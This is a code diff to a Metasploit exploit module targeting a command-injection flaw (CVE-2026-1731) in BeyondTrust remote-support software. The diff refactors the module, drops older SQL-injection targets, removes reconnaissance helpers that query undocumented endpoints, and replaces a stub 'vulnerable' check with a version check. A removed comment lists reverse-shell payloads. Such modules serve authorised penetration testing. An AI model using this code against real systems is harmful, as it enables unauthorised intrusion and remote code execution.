+++ modules/exploits/linux/http/beyondtrust_pra_rs_command_injection.rb
@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
+  include Msf::Exploit::Remote::HTTP::Beyondtrust
   include Msf::Exploit::Remote::HttpClient
   include Rex::Proto::Http::WebSocket
   prepend Msf::Exploit::Remote::AutoCheck
@@ -30,18 +31,12 @@ class MetasploitModule < Msf::Exploit::Remote
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          'sfewer-r7', # Rapid7 Analysis and Metasploit module (CVE-2024-12356 / CVE-2025-1094)
-          'Harsh Jaiswal', # Discovery of CVE-2026-1731
-          'Jonah Burgess (CryptoCat)' # Added support for CVE-2026-1731
+          'Harsh Jaiswal', # Discovery
+          'Jonah Burgess (CryptoCat)' # Module
         ],
         'References' => [
           ['CVE', '2026-1731'], # Direct OS command injection in BeyondTrust
-          ['CVE', '2025-1094'], # SQL injection in PostgreSQL code
-          ['CVE', '2024-12356'], # Argument injection in BeyondTrust (may be combined with CVE-2025-1094)
           ['URL', 'https://www.beyondtrust.com/trust-center/security-advisories/bt26-02'], # Vendor advisory for CVE-2026-1731
-          ['URL', 'https://www.beyondtrust.com/trust-center/security-advisories/bt24-10'], # Vendor advisory for CVE-2024-12356
-          ['URL', 'https://www.postgresql.org/support/security/CVE-2025-1094/'], # Vendor advisory for CVE-2025-1094
-          ['URL', 'https://attackerkb.com/topics/G5s8ZWAbYH/cve-2024-12356/rapid7-analysis'], # Rapid7 Analysis (CVE-2024-12356 / CVE-2025-1094)
           ['URL', 'https://attackerkb.com/topics/jNMBccstay/cve-2026-1731/rapid7-analysis'] # Rapid7 Analysis (CVE-2026-1731)
         ],
         'DisclosureDate' => '2026-02-06',
@@ -50,7 +45,7 @@ class MetasploitModule < Msf::Exploit::Remote
         'Privileged' => false, # Executes as the site user.
         'Targets' => [
           [
-            'CVE-2026-1731 (Command Injection)', {
+            'Command Injection', {
               'Payload' => {
                 'DisableNops' => true,
                 # We are injecting into a Bash arithmetic evaluation: a[$(command)]0.
@@ -59,33 +54,7 @@ class MetasploitModule < Msf::Exploit::Remote
               }
             }
           ],
-          [
-            'CVE-2025-1094 (SQL Injection)', {
-              'Payload' => {
-                'DisableNops' => true,
-                # Our payload is passed to the PHP function pg_escape_string. We want to avoid any single quotes
-                # getting escaped unexpectedly. The server may be configured to escape double quotes (not by default).
-                # We also want to avoid any backward slash characters if CVE-2024-12356 is being leveraged.
-                'BadChars' => '\'"\\'
-              }
-            }
-          ],
-          [
-            'CVE-2025-1094 (SQLi) with CVE-2024-12356 (Argument Injection)', {
-              'Payload' => {
-                'DisableNops' => true,
-                # Our payload is passed to the PHP function pg_escape_string. We want to avoid any single quotes
-                # getting escaped unexpectedly. The server may be configured to escape double quotes (not by default).
-                # We also want to avoid any backward slash characters if CVE-2024-12356 is being leveraged.
-                'BadChars' => '\'"\\'
-              }
-            }
-          ]
         ],
-        # NOTE: Tested with the following payloads:
-        #   cmd/linux/http/x64/meterpreter/reverse_tcp
-        #   cmd/unix/reverse_bash
-        #   cmd/unix/generic
         'DefaultOptions' => {
           'RPORT' => 443,
           'SSL' => true,
@@ -114,7 +83,13 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def check
-    CheckCode::Vulnerable('Yaay!')
+    version = get_version
+    return CheckCode::Unknown('Failed to determine BeyondTrust version') if version.nil?
+
+    version = Rex::Version.new(version)
+    return CheckCode::Appears("Detected vulnerable version of BeyondTrust #{version}") if version <= Rex::Version.new('25.3.1')
+
+    CheckCode::Safe("BeyondTrust version #{version} is not vulnerable")
   end
 
   def exploit
@@ -174,7 +149,6 @@ class MetasploitModule < Msf::Exploit::Remote
         break
       end
     end
-
     wsock.wsclose
   rescue Rex::Proto::Http::WebSocket::ConnectionError => e
     if e.http_response && !e.http_response.body.blank?
@@ -184,116 +158,7 @@ class MetasploitModule < Msf::Exploit::Remote
         print_error(e.http_response.body)
       end
     end
-    raise
+    fail_with(Failure::PayloadFailed, "WebSocket connection failed: #{e.message}")
   end
 
-  # We need to know the target sites company name, or FQDN, in order to successfully establish a WebSocket connection.
-  # We first favor the user setting either the TargetCompanyName or TargetServerFQDN options. If not set we then try
-  # an undocumented API endpoint /get_mech_list, that should return the target site company name. Finally, we fall
-  # back on the /download_client_connector endpoint which will also report a servername and site FQDN.
-  def get_site_info
-    if !datastore['TargetCompanyName'].blank? || !datastore['TargetServerFQDN'].blank?
-      return {
-        company: datastore['TargetCompanyName'],
-        server: datastore['TargetServerFQDN']
-      }
-    end
-
-    site_info = get_site_info_via_mech_list
-
-    return site_info unless site_info.nil?
-
-    get_site_info_via_download_client_connector
-  end
-
-  # The internal undocumented API located at the /get_mech_list endpoint will return the company name
-  # of the target site. We try version=3 (JSON, newer instances) first, then fall back to version=2
-  # (semicolon-separated key=value pairs, for older instances such as 22.x where version=3 returns HTTP 500).
-  def get_site_info_via_mech_list
-    %w[3 2].each do |version|
-      opts = {
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'get_mech_list'),
-        'vars_get' => { 'version' => version }
-      }
-      opts['headers'] = { 'Accept' => 'application/json' } if version == '3'
-
-      res = send_request_cgi(opts)
-      next unless res&.code == 200
-
-      company = version == '3' ? parse_mech_list_json(res) : parse_mech_list_text(res)
-      next if company.blank?
-
-      vprint_status("Got site info via the /get_mech_list?version=#{version} endpoint.")
-      return { company: company, server: nil }
-    end
-
-    error('get_site_info_via_mech_list company not found.')
-  end
-
-  def parse_mech_list_json(res)
-    res.get_json_document['company']
-  end
-
-  # Parses semicolon-separated key=value pairs (e.g. "company=sewtest;product=ingredi").
-  def parse_mech_list_text(res)
-    res.body.split(';').each do |part|
-      part.strip!
-      return part.sub('company=', '') if part.start_with?('company=')
-    end
-    nil
-  end
-
-  def get_site_info_via_download_client_connector
-    res1 = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'download_client_connector'),
-      'vars_get' => {
-        'issue_menu' => '1'
-      }
-    )
-
-    return module_error('get_site_info Connection 1 failed.') unless res1
-
-    return module_error("get_site_info Request 1, unexpected response code #{res1.code}.") unless res1.code == 200
-
-    return module_error('get_site_info_via_download_client_connector Request 1, unable to match data-html-url') unless res1.body =~ %r{data-html-url="\S+(/chat/html/\S+)"}i
-
-    res2 = send_request_cgi(
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, Rex::Text.html_decode(::Regexp.last_match(1)))
-    )
-
-    return module_error('get_site_info_via_download_client_connector Connection 2 failed.') unless res2
-
-    return module_error("get_site_info_via_download_client_connector Request 2, unexpected response code #{res2.code}.") unless res2.code == 200
-
-    return module_error('get_site_info_via_download_client_connector Request 2, unable to match data-company.') unless res2.body =~ /data-company="(\S+)"/i
-
-    company = Rex::Text.html_decode(::Regexp.last_match(1))
-
-    return module_error('get_site_info_via_download_client_connector Request 2, unable to match data-servers.') unless res2.body =~ /data-servers="(\S+)"/i
-
-    servers = Rex::Text.html_decode(::Regexp.last_match(1))
-
-    servers_array = JSON.parse(servers)
-
-    return module_error('get_site_info_via_download_client_connector Request 2, data-servers not a valid array.') unless servers_array.instance_of? Array
-
-    return module_error('get_site_info_via_download_client_connector Request 2, data-servers is an empty array.') if servers_array.empty?
-
-    server = servers_array.first
-
-    vprint_status('Got site info via the /download_client_connector endpoint.')
-
-    { company: company, server: server }
-  rescue JSON::ParserError
-    module_error('get_site_info_via_download_client_connector JSON parse error.')
-  end
-
-  # Helper method to print an error and then return nil.
-  def module_error(message)
-    print_error(message)
-    nil
-  end
 end
